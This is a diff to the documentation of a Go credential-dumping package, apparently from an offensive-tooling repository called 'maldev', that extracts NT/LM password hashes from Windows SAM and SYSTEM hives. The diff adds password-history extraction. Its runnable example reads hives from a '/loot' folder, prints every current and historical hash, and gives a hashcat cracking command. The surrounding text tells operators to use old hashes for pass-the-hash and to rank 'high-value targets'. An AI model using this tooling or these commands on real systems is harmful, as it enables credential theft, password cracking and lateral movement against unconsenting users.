@@ -81,7 +81,7 @@ shells out to `reg.exe save` and feeds the files to `Dump`).
 #### `type Account struct`
 
 - godoc: one decrypted user record from the SAM hive.
-- Description: fields — `Username string` (UTF-16 decoded sAMAccountName), `RID uint32` (relative identifier, the numeric tail of the user SID), `LM []byte` (16-byte LM hash or nil when inactive), `NT []byte` (16-byte NT/MD4 hash or nil when inactive). LM is nil on Vista+ unless explicitly enabled by GPO; NT is nil only for accounts with truly empty passwords.
+- Description: fields — `Username string` (UTF-16 decoded sAMAccountName), `RID uint32` (relative identifier, the numeric tail of the user SID), `LM []byte` (16-byte LM hash or nil when inactive), `NT []byte` (16-byte NT/MD4 hash or nil when inactive), `NTHistory [][]byte` and `LMHistory [][]byte` (per-account password-history hashes, most-recent-first; nil/empty when no history is stored or `PasswordHistorySize=0`). LM is nil on Vista+ unless explicitly enabled by GPO; NT is nil only for accounts with truly empty passwords. Each historical NT hash is a full pass-the-hash candidate.
 - Side effects: pure data.
 - OPSEC: silent (data type).
 - Required privileges: none (data).
@@ -93,6 +93,17 @@ shells out to `reg.exe save` and feeds the files to `Dump`).
 - Description: renders the all-zeros sentinel `aad3b435b51404eeaad3b435b51404ee` (LM) / `31d6cfe0d16ae931b73c59d7e0c089c0` (NT empty-password MD4) when the corresponding hash is nil. Compatible with mimikatz / impacket consumers.
 - Parameters: receiver.
 - Returns: single ASCII line, no trailing newline.
+- Side effects: none.
+- OPSEC: pure formatting.
+- Required privileges: none.
+- Platform: cross-platform.
+
+#### `(Account).PwdumpHistory() string`
+
+- godoc: render one pwdump line per historical hash slot, suffixed `_history0`, `_history1`, … (index 0 = most recent prior hash).
+- Description: NT and LM histories are zipped index-by-index; missing slots on either side render as the inactive sentinel. Returns the empty string when both history slices are empty. Operators feed this output straight into hashcat / John alongside the current-hash pwdump line — every historical hash is a pass-the-hash candidate against any host that hasn't enforced rotation.
+- Parameters: receiver.
+- Returns: ASCII multi-line string with trailing newline; empty when no history.
 - Side effects: none.
 - OPSEC: pure formatting.
 - Required privileges: none.
@@ -111,6 +122,17 @@ shells out to `reg.exe save` and feeds the files to `Dump`).
 
 - godoc: render the multi-line pwdump file — one `Account.Pwdump()` per line, joined with `\n`.
 - Description: convenience for piping the whole result to a `*os.File` or stdout.
+- Parameters: receiver.
+- Returns: ASCII multi-line string. Trailing newline included.
+- Side effects: none.
+- OPSEC: pure formatting.
+- Required privileges: none.
+- Platform: cross-platform.
+
+#### `(Result).PwdumpWithHistory() string`
+
+- godoc: render the multi-line pwdump file plus every account's history lines directly under its current-hash line.
+- Description: per-account output shape is `username:RID:LM:NT:::\n` followed by zero-or-more `username_historyN:RID:LM:NT:::\n`. Use when you want hashcat / John to attempt every hash a user has ever held — current + history — in one pass. Backwards compatible: callers wanting only current hashes keep using `Pwdump()`.
 - Parameters: receiver.
 - Returns: ASCII multi-line string. Trailing newline included.
 - Side effects: none.
@@ -175,6 +197,37 @@ if err != nil {
     panic(err)
 }
 fmt.Print(res.Pwdump())
+```
+
+### With password history — feed hashcat every hash a user has ever held
+
+```go
+import (
+    "fmt"
+    "os"
+
+    "github.com/oioio-space/maldev/credentials/samdump"
+)
+
+system, _ := os.Open(`/loot/SYSTEM`)
+defer system.Close()
+sam, _ := os.Open(`/loot/SAM`)
+defer sam.Close()
+sysFI, _ := system.Stat()
+samFI, _ := sam.Stat()
+
+res, _ := samdump.Dump(system, sysFI.Size(), sam, samFI.Size())
+
+// Current + every historical hash, ready to pipe into:
+//   hashcat -m 1000 -a 0 hashes.txt rockyou.txt
+fmt.Print(res.PwdumpWithHistory())
+
+// Or per-account introspection — count how many prior NT hashes
+// each user has, useful for picking high-value targets first.
+for _, a := range res.Accounts {
+    fmt.Printf("%s (RID %d): current + %d historical NT hashes\n",
+        a.Username, a.RID, len(a.NTHistory))
+}
 ```
 
 ### Composed — live host, cleanup, exfil
@@ -258,8 +311,14 @@ for the runnable variant.
 - **Local accounts only.** SAM holds only the workstation's local
   users. Domain credentials live in `NTDS.dit` on the DC; use
   separate tooling (impacket secretsdump remote, mimikatz `lsadump::dcsync`).
-- **No history.** Earlier NT/LM hashes (password-history feature)
-  are stored in additional `V` regions not currently parsed.
+- **History coverage.** Per-account NT and LM password-history
+  blobs are now decoded and surfaced as `Account.NTHistory` /
+  `Account.LMHistory` (most-recent-first). Render via
+  `Account.PwdumpHistory()` / `Result.PwdumpWithHistory()`. Each
+  historical NT hash is a full pass-the-hash candidate against any
+  host that hasn't enforced rotation. Windows default
+  `MaximumPasswordHistory=24` — expect up to 24 historical hashes
+  per account. LM history is empty by default on Win10 1607+.
 - **DPAPI / cached creds out of scope.** Domain cached credentials
   (`Cache{N}`) live in `SECURITY` hive; `SECURITY` parsing is not
   in this package.
